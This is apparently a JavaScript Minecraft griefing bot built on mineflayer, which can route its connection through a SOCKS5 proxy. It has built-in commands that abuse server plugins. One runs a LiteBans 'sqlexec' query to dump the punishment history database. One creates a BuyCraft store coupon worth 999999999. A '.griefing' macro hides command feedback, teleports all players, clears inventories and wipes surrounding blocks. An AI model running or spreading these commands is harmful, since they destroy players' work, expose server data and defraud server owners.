const mccolors = require('minecraft-colors')
const mineflayer = require('mineflayer');
const ProxyAgent = require('proxy-agent');
const socks = require('socks').SocksClient
const readline = require('readline');
const proxy = require('proxy-agent');
const fs = require('fs');

const characters = {
  '"black"': '§0',
  '"dark_blue"': '§1',
  '"dark_green"': '§2',
  '"dark_aqua""': '§3',
  '"dark_red"': '§4',
  '"dark_purple"': '§5',
  '"gold"': '§6',
  '"gray"': '§7',
  '"dark_gray"': '§8',
  '"blue"': '§9',
  '"green"': '§a',
  '"aqua"': '§b',
  '"red"': '§c',
  '"light_purple"': '§d',
  '"yellow"': '§e',
  '"white"': '',
  '"text"': '',
  '"clickEvent"': '',
  '"action"': '',
  '"open_url"': '',
  '"value"': '',
  '"strikethrough"': '',
  '"underlined"': '',
  '"obfuscated"': '',
  '"translate"': '',
  '"italic"': '',
  '"color"': '',
  '"extra"': '',
  '"bold"': '',
  '"dark"': '',
  '"text"': '',
  '{': '',
  '}': '',
  '"': '',
  ':': '',
  'false,': '',
  'true,': '',
  ',': '',
  'http//Minecraft.net': '',
};

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const host = process.argv[2]
const port = process.argv[3]
const username = process.argv[4]
const protocol = process.argv[5]
const lang = process.argv[6]
const proxyHost = process.argv[7];
const proxyPort = process.argv[8];
let lang_data = fs.readFileSync(`settings/lang/${lang}.json`);
let lang_json = JSON.parse(lang_data);
const botConnected = lang_json.commands.connect.BOT_CONNECTED
const botExpelled = lang_json.commands.connect.BOT_EXPELLED
const invalidProxy = lang_json.INVALID_PROXY
const exit = lang_json.commands.connect.EXIT

function replaceWords(str) {
  try {
    for (let key in characters) {
      str = str.replace(new RegExp(key, 'g'), characters[key]);
    }
    
    str = str.replace(/\[/g, '').replace(/\]/g, '').replace(/\\n/g, ''); 
    return str;
  } catch {
    return 'Error'
  }
}

function createBot() {
  if (proxyHost == null) {
    var bot = mineflayer.createBot({
    host: host,
    port: parseInt(port),
    username: username,
    version: protocol,
    hideErrors: true
    });

  } else {
    var bot = mineflayer.createBot({
      connect: bot => {
        socks.createConnection({
          proxy: {
            host: proxyHost,
            port: parseInt(proxyPort),
            type: 5
          },
          command: 'connect',
          destination: {
            host: host,
            port: parseInt(port)
          }
        }, (err, info) => {
          if (err) {
            if (err.toString().includes(`${proxyHost}:${proxyPort}`)) {
              console.log(mccolors.translateColors(`\n    §f[§c#§f] §c${invalidProxy}\n`))
              console.log(mccolors.translateColors(`    §f[§c#§f] ${exit}`))
            } else {
              console.log(err)
              console.log(mccolors.translateColors(`\n    §f[§c#§f] ${exit}\n`))
            }
            return
          }
          bot.setSocket(info.socket)
          bot.emit('connect')
        })
      },
      agent: new ProxyAgent({ protocol: 'socks5:', host: proxyHost, port: proxyPort }),
      username: username,
      version: protocol,
      hideErrors: true
    })
  }

  bot.on('login', () => {
    console.log(mccolors.translateColors(`\n    §f[§c#§f] §a${botConnected}\n`))
  })

  bot.on('message', (toAnsi)=>{
    var msg = toAnsi.toAnsi()
    console.log(`    ${msg}`)
  
    try {
      rl.question('', function (command) {
        if (command == '.help') {
          console.log('help-message')
        }

        else if (command == '.litebans') {
          bot.chat('/litebans sqlexec select * from {history}')
        }

        else if (command == '.buycraft') {
          bot.chat('/buycraft coupon create value 999999999')
        }
    
        else if (command == '.griefing') {
          bot.chat('/gamerule sendCommandFeedback false')
          bot.chat('/tp @a @p')
          bot.chat('/tpall')
          bot.chat('/fill ~-15 ~-15 ~-15 ~16 ~16 ~16 minecraft:air')
          bot.chat('//sphere 0 40')
          bot.chat('/minecraft:clear @a')
        }
        
        else if (command == '.exit') {
          bot.quit()
          console.log(mccolors.translateColors(`\n    §f[§c#§f] ${exit}\n`))
        }
    
        else {
          bot.chat(command)
        }
          
      });
    } catch (err) {
      bot.quit()
      console.log(mccolors.translateColors(`\n    §f[§c#§f] ${exit}\n`))
    }
  })

  bot.on('error', (err) => {
    err = replaceWords(err)
    console.log(mccolors.translateColors(`\n    §f[§c#§f] §fError: ${err}\n`))
    bot.quit()
    console.log(mccolors.translateColors(`\n    §f[§c#§f] ${exit}\n`))
  })

  bot.on('kicked', reason => {
    reason = replaceWords(reason)
    console.log(mccolors.translateColors(`\n    §f[§c#§f] §f${botExpelled}§c${reason}\n`))
    bot.quit()
    console.log(mccolors.translateColors(`    §f[§c#§f] ${exit}`))
  })
}

createBot()
